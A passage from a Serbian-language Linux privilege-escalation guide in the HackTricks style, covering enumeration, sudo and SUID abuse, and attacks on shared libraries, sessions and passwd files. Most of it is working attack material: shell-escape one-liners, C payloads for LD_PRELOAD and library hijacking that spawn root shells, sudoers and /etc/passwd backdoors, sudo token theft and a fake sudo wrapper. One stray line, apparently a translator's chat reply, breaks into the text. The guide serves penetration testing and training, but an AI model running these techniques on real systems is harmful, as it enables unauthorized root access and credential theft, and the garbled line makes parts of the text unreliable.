<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Saznajte kako da enumerate i exploit D-Bus komunikaciju ovde:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mreža**

Uvek je zanimljivo enumerate mrežu i utvrditi poziciju mašine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Uvek proverite mrežne servise koji rade na mašini sa kojima niste mogli da komunicirate pre pristupa:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Proverite da li možete da sniff-ujete saobraćaj. Ako možete, mogli biste dohvatiti neke credentials.
```
timeout 1 tcpdump
```
## Korisnici

### Generička enumeracija

Proveri **ko** si, koje **privileges** imaš, koji su **korisnici** na sistemu, koji mogu da se **login** i koji imaju **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Neke verzije Linuxa su bile pogođene bagom koji omogućava korisnicima sa **UID > INT_MAX** da eskaliraju privilegije. Više informacija: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
Iskoristite ga koristeći: **`systemd-run -t /bin/bash`**

### Grupe

Proverite da li ste **član neke grupe** koja bi vam mogla dodeliti root privilegije:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Međuspremnik

Proverite da li se u međuspremniku nalazi nešto zanimljivo (ako je moguće)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politika lozinki
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Poznate lozinke

Ako **znate bilo koju lozinku** u okruženju, **pokušajte da se prijavite kao svaki korisnik** koristeći tu lozinku.

### Su Brute

Ako vam ne smeta da napravite puno buke i ako su `su` i `timeout` binarni fajlovi prisutni na računaru, možete pokušati da izvršite brute-force nad korisnikom koristeći [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sa parametrom `-a` takođe pokušava da izvrši brute-force nad korisnicima.

## Zloupotrebe zapisivog PATH-a

### $PATH

Ako otkrijete da možete **pisati u neki folder iz $PATH**, možda ćete moći da eskalirate privilegije tako što ćete **napraviti backdoor u zapisivom folderu** pod imenom neke komande koja će biti izvršena od strane drugog korisnika (idealno root) i koja **se ne učitava iz foldera koji se nalazi pre** vašeg zapisivog foldera u $PATH.

### SUDO and SUID

Možda vam je dozvoljeno da izvršite neku komandu koristeći sudo ili komande mogu imati suid bit. Proverite to koristeći:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Neke **neočekivane komande omogućavaju vam da čitate i/ili pišete fajlove ili čak izvršite komandu.** На пример:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo konfiguracija može dozvoliti korisniku da izvrši neku komandu sa privilegijama drugog korisnika bez poznavanja lozinke.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
U ovom primeru korisnik `demo` može da pokrene `vim` kao `root`; sada je trivialno dobiti shell tako što ćete dodati ssh key u root direktorijum ili pozvati `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ova direktiva omogućava korisniku da **postavi varijablu okruženja** dok izvršava nešto:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ovaj primer, **zasnovan na HTB machine Admirer**, bio je **ranjiv** na **PYTHONPATH hijacking** da učita proizvoljnu python biblioteku dok se skripta izvršava kao root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sačuvan putem sudo env_keep → root shell

Ako sudoers sačuva `BASH_ENV` (npr., `Defaults env_keep+="ENV BASH_ENV"`), možete iskoristiti Bash-ovo ponašanje pri neinteraktivnom startovanju da pokrenete proizvoljan kod kao root prilikom pozivanja dozvoljene komande.

- Zašto ovo radi: Za neinteraktivne shelove, Bash evaluira `$BASH_ENV` i učitava taj fajl pre pokretanja ciljnog skripta. Mnoge sudo politike dozvoljavaju pokretanje skripte ili shell wrapper-a. Ako `BASH_ENV` bude sačuvan od strane sudo, vaš fajl će biti učitan sa root privilegijama.

- Zahtevi:
- Pravilo u sudo koje možete pokrenuti (bilo koji target koji neinteraktivno poziva `/bin/bash`, ili bilo koja bash skripta).
- `BASH_ENV` prisutan u `env_keep` (proverite sa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Ojačavanje:
- Uklonite `BASH_ENV` (i `ENV`) iz `env_keep`, preferirajte `env_reset`.
- Izbegavajte shell wrapper-e za komande kojima je dozvoljen sudo; koristite minimalne binarije.
- Razmotrite sudo I/O logovanje i alertovanje kada se koriste sačuvane env varijable.

### Putanje za zaobilaženje sudo izvršenja

**Pređite** na čitanje drugih fajlova ili koristite **symlinks**. For example in sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ako se koristi **wildcard** (\*), to je još lakše:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Protivmere**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez putanje komande

Ako je **sudo permission** dodeljena jednoj komandi **bez navođenja putanje**: _hacker10 ALL= (root) less_ možete to iskoristiti menjajući promenljivu PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ova tehnika se može koristiti i ako **suid** binarni fajl **pokreće drugu komandu bez navođenja putanje do nje (uvek proverite pomoću** _**strings**_ **sadržaj sumnjivog SUID binarnog fajla)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

Ako **suid** binarni fajl **pokreće drugu komandu navodeći putanju**, onda možete pokušati da **export a function** koja nosi ime komande koju suid fajl poziva.

Na primer, ako suid binarni fajl poziva _**/usr/sbin/service apache2 start**_, treba da pokušate da kreirate funkciju i export-ujete je:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Zatim, kada pozovete suid binary, ova funkcija će se izvršiti

### LD_PRELOAD & **LD_LIBRARY_PATH**

Okruženjska promenljiva **LD_PRELOAD** koristi se za određivanje jedne ili više deljenih biblioteka (.so fajlova) koje će loader učitati pre svih ostalih, uključujući standardnu C biblioteku (`libc.so`). Ovaj postupak je poznat kao preloading a library.

Međutim, da bi se održala bezbednost sistema i sprečilo zloupotrebljavanje ove osobine, naročito kod **suid/sgid** izvršnih fajlova, sistem primenjuje određene uslove:

- Loader ignoriše **LD_PRELOAD** za izvršne fajlove gde realni user ID (_ruid_) nije isti kao efektivni user ID (_euid_).
- Za izvršne fajlove sa suid/sgid, unapred se učitavaju samo biblioteke koje se nalaze u standardnim putanjama i koje su takođe suid/sgid.

Eskalacija privilegija može da se dogodi ako imate mogućnost da izvršavate komande sa `sudo` i izlaz `sudo -l` sadrži izjavu **env_keep+=LD_PRELOAD**. Ova konfiguracija omogućava da promenljiva okruženja **LD_PRELOAD** opstane i bude prepoznata čak i kada se komande pokreću sa `sudo`, što potencijalno može dovesti do izvršenja proizvoljnog koda sa povišenim privilegijama.
```
Defaults        env_keep += LD_PRELOAD
```
Sačuvajte kao **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Zatim **compile it** koristeći:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na kraju, **escalate privileges** pokretanjem
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Sličan privesc se može zloupotrebiti ako napadač kontroliše env promenljivu **LD_LIBRARY_PATH**, jer on kontroliše putanju na kojoj će se biblioteke pretraživati.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Kada naiđete na binarni fajl sa **SUID** dozvolama koji deluje neobično, dobra je praksa proveriti da li pravilno učitava **.so** fajlove. To se može proveriti pokretanjem sledeće komande:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na primer, greška kao što je _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ ukazuje na mogućnost eksploatacije.

Da biste to iskoristili, kreirajte C fajl, na primer _"/path/to/.config/libcalc.c"_, koji sadrži sledeći kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ovaj kod, kada se kompajlira i izvrši, ima za cilj da poveća privilegije manipulišući dozvolama fajlova i pokretanjem shell-a sa povišenim privilegijama.

Kompajlirajte navedeni C fajl u shared object (.so) fajl sa:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Konačno, pokretanje pogođenog SUID binary trebalo bi da pokrene exploit, omogućavajući potencijalno kompromitovanje sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sada kada smo pronašli SUID binary koji učitava biblioteku iz foldera u koji možemo pisati, kreirajmo biblioteku u tom folderu pod odgovarajućim imenom:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ako dobijete grešku kao što je
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to znači da biblioteka koju ste generisali mora da ima funkciju nazvanu `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) je kurirana lista Unix binarnih fajlova koje napadač može iskoristiti da zaobiđe lokalna sigurnosna ograničenja. [**GTFOArgs**](https://gtfoargs.github.io/) je isto, ali za slučajeve gde možete **samo ubacivati argumente** u komandu.

Projekat prikuplja legitimne funkcije Unix binarnih fajlova koje se mogu zloupotrebiti da se pobegne iz ograničenih shell-ova, eskalira ili održi povišene privilegije, prenesu fajlovi, pokrenu bind i reverse shells, i olakšaju ostali post-exploitation zadaci.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ako možete da pokrenete `sudo -l` možete koristiti alat [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) da proverite da li on pronalazi način da iskoristi neko sudo pravilo.

### Reusing Sudo Tokens

U slučajevima gde imate **sudo access** ali ne i lozinku, možete eskalirati privilegije tako što ćete **sačekati izvršenje sudo komande i potom oteti session token**.

Zahtevi za eskalaciju privilegija:

- Već imate shell kao korisnik "_sampleuser_"
- "_sampleuser_" je **koristio `sudo`** da izvrši nešto u **poslednjih 15 minuta** (po defaultu to je trajanje sudo tokena koje nam omogućava da koristimo `sudo` bez unošenja lozinke)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` je dostupan (možete ga otpremiti)

(Privremeno možete omogućiti `ptrace_scope` sa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ili trajno modifikovanjem `/etc/sysctl.d/10-ptrace.conf` i postavljanjem `kernel.yama.ptrace_scope = 0`)

Ako su svi ovi zahtevi ispunjeni, **možete eskalirati privilegije koristeći:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **Drugi exploit** (`exploit_v2.sh`) će kreirati sh shell u _/tmp_ **u vlasništvu root-a sa setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **treći exploit** (`exploit_v3.sh`) će **kreirati sudoers file** koji čini **sudo tokens večnim i omogućava svim korisnicima da koriste sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ako imate **write permissions** u folderu ili na bilo kojoj od datoteka kreiranih unutar foldera možete koristiti binar [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) da **create a sudo token for a user and PID**.\
Na primer, ako možete prepisati fajl _/var/run/sudo/ts/sampleuser_ i imate shell kao taj user sa PID 1234, možete **obtain sudo privileges** bez potrebe da znate password radeći:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Fajl `/etc/sudoers` i fajlovi unutar `/etc/sudoers.d` konfigurišu ko može da koristi `sudo` i kako. Ovi fajlovi **po podrazumevanoj vrednosti mogu biti pročitani samo od strane korisnika root i grupe root**.\
**Ako** možete **pročitati** ovaj fajl, mogli biste **pribaviti neke zanimljive informacije**, a ako možete **pisati** u bilo koji fajl, moći ćete da **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ako imate pravo pisanja, možete zloupotrebiti ovu dozvolu.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Još jedan način zloupotrebe ovih dozvola:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Postoje neke alternative za binarni `sudo`, kao što je `doas` za OpenBSD — ne zaboravite da proverite njegovu konfiguraciju u `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ako znate da **korisnik obično pristupa mašini i koristi `sudo`** da bi eskalirao privilegije i dobili ste shell u tom korisničkom kontekstu, možete **kreirati novi sudo executable** koji će izvršiti vaš kod kao root, a zatim korisničku komandu. Zatim, **izmenite $PATH** korisničkog konteksta (na primer dodavanjem novog puta u .bash_profile) tako da kada korisnik pozove sudo, izvrši se vaš sudo executable.

Note that if the user uses a different shell (not bash) you will need to modify other files to add the new path. For example[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. You can find another example in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Or running something like:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Deljena biblioteka

### ld.so

Fajl `/etc/ld.so.conf` pokazuje **odakle dolaze učitane konfiguracione datoteke**. Obično ovaj fajl sadrži sledeću putanju: `include /etc/ld.so.conf.d/*.conf`

To znači da će biti pročitane konfiguracione datoteke iz `/etc/ld.so.conf.d/*.conf`. Te konfiguracione datoteke **pokazuju na druge foldere** u kojima će se tražiti **biblioteke**. Na primer, sadržaj `/etc/ld.so.conf.d/libc.conf` je `/usr/local/lib`. **To znači da će sistem tražiti biblioteke unutar `/usr/local/lib`**.

Ako iz bilo kog razloga **korisnik ima write permissions** na bilo koju od navedenih putanja: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bilo koju datoteku unutar `/etc/ld.so.conf.d/` ili bilo koji folder naveden u konfiguracionim fajlovima iz `/etc/ld.so.conf.d/*.conf` on može da escalate privileges.\ Pogledajte **how to exploit this misconfiguration** na sledećoj stranici:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiranjem lib u `/var/tmp/flag15/` biće korišćen od strane programa na ovom mestu, kako je navedeno u promenljivoj `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Zatim kreirajte malicioznu biblioteku u `/var/tmp` koristeći `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Mogućnosti

Linux capabilities pružaju **podskup dostupnih root privilegija procesu**. Ovo efikasno razbija root **privilegije na manje i prepoznatljive jedinice**. Svaka od ovih jedinica može potom biti nezavisno dodeljena procesima. Na ovaj način se smanjuje ukupan skup privilegija, čime se umanjuju rizici od eksploatacije.\
Pročitajte sledeću stranicu da **saznate više o capabilities i kako ih zloupotrebiti**:

{{#ref}}
linux-capabilities.md
{{#endref}}

## Dozvole direktorijuma

U direktorijumu, **bit za "execute"** implicira da pogođeni korisnik može da **cd** u folder.\
**"read"** bit implicira da korisnik može da **prikaže** **fajlove**, a **"write"** bit implicira da korisnik može da **obriše** i **kreira** nove **fajlove**.

## ACLs

Access Control Lists (ACLs) predstavljaju sekundarni sloj diskrecionih dozvola, sposoban da **prepiše tradicionalne ugo/rwx dozvole**. Ove dozvole poboljšavaju kontrolu pristupa fajlovima ili direktorijumima omogućavajući ili odbijajući prava određenim korisnicima koji nisu vlasnici niti deo grupe. Ovaj nivo **granularnosti omogućava preciznije upravljanje pristupom**. Dalje detalje možete pronaći [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dodeli** korisniku "kali" dozvole za čitanje i pisanje nad fajlom:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pronađi** fajlove sa specifičnim ACL-ovima iz sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otvorene shell sesije

U **starijim verzijama** možete izvršiti **hijack** neke **shell** sesije drugog korisnika (**root**).\
U **najnovijim verzijama** moći ćete se **povezati** samo na screen sesije **svog korisnika**. Međutim, možete pronaći **zanimljive informacije unutar sesije**.

### screen sessions hijacking

**Prikaži screen sesije**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Priključite se na sesiju**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Ovo je bio problem sa **starim tmux verzijama**. Nisam mogao da hijack-ujem tmux (v2.1) sesiju koju je kreirao root kao neprivilegovan korisnik.

**Lista tmux sesija**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Priključi se na sesiju**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Proverite **Valentine box from HTB** za primer.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
Ovaj bug nastaje pri kreiranju novog ssh ključa na tim OS, jer je bilo moguće **samo 32,768 varijacija**. To znači da se sve mogućnosti mogu izračunati i da, posedovanjem ssh public key, možete potražiti odgovarajući private key. Možete pronaći izračunate mogućnosti ovde: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Zanimljive konfiguracione vrednosti

- **PasswordAuthentication:** Specifies whether password authentication is allowed. The default is `no`.
- **PubkeyAuthentication:** Specifies whether public key authentication is allowed. The default is `yes`.
- **PermitEmptyPasswords**: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is `no`.

### PermitRootLogin

Specifies whether root can log in using ssh, default is `no`. Possible values:

- `yes`: root can login using password and private key
- `without-password` or `prohibit-password`: root can only login with a private key
- `forced-commands-only`: Root can login only using private key and if the commands options are specified
- `no` : ne

### AuthorizedKeysFile

Specifies files that contain the public keys that can be used for user authentication. It can contain tokens like `%h`, which will be replaced by the home directory. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding vam omogućava da **use your local SSH keys instead of leaving keys** (without passphrases!) na vašem serveru. Dakle, moći ćete da **jump** via ssh **to a host** i odatle **jump to another** host **using** the **key** located in your **initial host**.

Potrebno je да podesite ovu opciju u `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Obratite pažnju da ako je `Host` postavljen na `*`, svaki put kada korisnik pređe na drugu mašinu, taj host će moći da pristupi ključevima (što predstavlja bezbednosni problem).

Fajl `/etc/ssh_config` može **prepisati** ove **opcije** i dozvoliti ili zabraniti ovu konfiguraciju.\
Fajl `/etc/sshd_config` može **dozvoliti** ili **zabraniti** ssh-agent forwarding pomoću ključne reči `AllowAgentForwarding` (podrazumevano je dozvoljeno).

Ako otkrijete da je Forward Agent konfigurisana u okruženju, pročitajte sledeću stranicu jer **možda ćete moći da je zloupotrebite za eskalaciju privilegija**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Zanimljivi fajlovi

### Profil fajlovi

Fajl `/etc/profile` i fajlovi u `/etc/profile.d/` su **skripte koje se izvršavaju kada korisnik pokrene novu shell sesiju**. Dakle, ako možete **da napišete ili izmenite bilo koji od njih, možete eskalirati privilegije**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ako se pronađe neka sumnjiva skripta profila, treba je proveriti zbog **osetljivih podataka**.

### Passwd/Shadow fajlovi

Zavisno od OS-a, `/etc/passwd` i `/etc/shadow` fajlovi mogu koristiti drugo ime ili može postojati backup. Stoga se preporučuje da **pronađete sve njih** i **proverite da li možete da ih pročitate** da biste videli **da li u njima postoje hashovi**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Ponekad možete pronaći **password hashes** u fajlu `/etc/passwd` (ili ekvivalentnom).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd (moguće pisanje)

Prvo, generišite lozinku pomoću jedne od sledećih komandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Pošaljite sadržaj src/linux-hardening/privilege-escalation/README.md koji želite da prevedem. Ne mogu da izvršim komande na vašem sistemu; mogu da vam dam komandu za dodavanje korisnika `hacker` i za generisanje lozinke.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Npr: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sada možete koristiti komandu `su` sa `hacker:hacker`

Alternativno, možete koristiti sledeće linije da dodate lažnog korisnika bez lozinke.\
UPOZORENJE: ovo može oslabiti trenutnu bezbednost mašine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NAPOMENA: Na BSD platformama `/etc/passwd` se nalazi na `/etc/pwd.db` i `/etc/master.passwd`, takođe je `/etc/shadow` preimenovan u `/etc/spwd.db`.

Treba da proverite da li možete **pisati u neke osetljive fajlove**. Na primer, možete li pisati u neki **konfiguracioni fajl servisa**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na primer, ako mašina pokreće **tomcat** server i možete **izmeniti konfiguracioni fajl Tomcat servisa unutar /etc/systemd/,** onda možete izmeniti linije:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Vaš backdoor biće izvršen sledeći put kada se tomcat pokrene.

### Proverite foldere

Sledeći folderi mogu sadržati rezervne kopije ili zanimljive informacije: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Verovatno nećete moći da pročitate poslednji, ali pokušajte)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Neobične lokacije/Owned fajlovi
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Izmenjeni fajlovi u poslednjih nekoliko minuta
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB fajlovi
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
